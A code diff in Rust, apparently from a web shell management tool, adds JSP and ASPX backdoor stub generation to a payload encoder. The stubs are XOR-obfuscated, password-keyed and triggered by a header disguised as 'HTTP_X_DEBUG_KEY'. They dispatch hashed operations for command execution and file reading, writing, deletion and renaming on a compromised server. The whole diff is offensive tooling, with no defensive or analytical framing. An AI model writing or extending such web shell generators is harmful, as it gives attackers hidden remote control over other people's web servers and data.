@@ -15,6 +15,7 @@ use base64::Engine;
 use cbc::cipher::{BlockDecryptMut, BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
 use md5::{Digest, Md5};
 
+use crate::jsp_stub::{aspx_stub, jsp_stub};
 use crate::protocol::ProtocolError;
 
 /// AES-256-CBC。
@@ -1924,6 +1925,35 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__XOR__", &format!("{prefix}xor"))
                     .replace("__DEC__", &format!("{prefix}dec")))
 
+            }
+            "jsp" => {
+                // JSP stub：XOR 载荷 + md5 哈希分发 + 命令/文件（无第三方依赖，手动 JSON）
+                let xk = php_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                let h = |op: &str| -> String {
+                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+                    let mut n: u64 = 0;
+                    for (i, c) in digest.chars().take(8).enumerate() {
+                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+                    }
+                    n.to_string()
+                };
+                Ok(jsp_stub(&xk, &xor_hex("HTTP_X_DEBUG_KEY", &xk), &xor_hex(token, &xk), &xor_hex(&key_hex, &xk), &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"), &h("delete"), &h("rename"), &h("mkdir")))
+            }
+            "aspx" => {
+                let xk = php_ident();
+                let key_hex = md5_hex(password);
+                let token = &key_hex[..16];
+                let h = |op: &str| -> String {
+                    let digest = format!("{:x}", md5::Md5::digest(op.as_bytes()));
+                    let mut n: u64 = 0;
+                    for (i, c) in digest.chars().take(8).enumerate() {
+                        n |= (c.to_digit(16).unwrap_or(0) as u64) << (4 * (7 - i));
+                    }
+                    n.to_string()
+                };
+                Ok(aspx_stub(&xk, &xor_hex("HTTP_X_DEBUG_KEY", &xk), &xor_hex(token, &xk), &xor_hex(&key_hex, &xk), &h("probe"), &h("exec"), &h("list"), &h("read"), &h("write"), &h("delete"), &h("rename"), &h("mkdir")))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "NATIVE 编码器暂仅支持 PHP（{other} 待实现）"
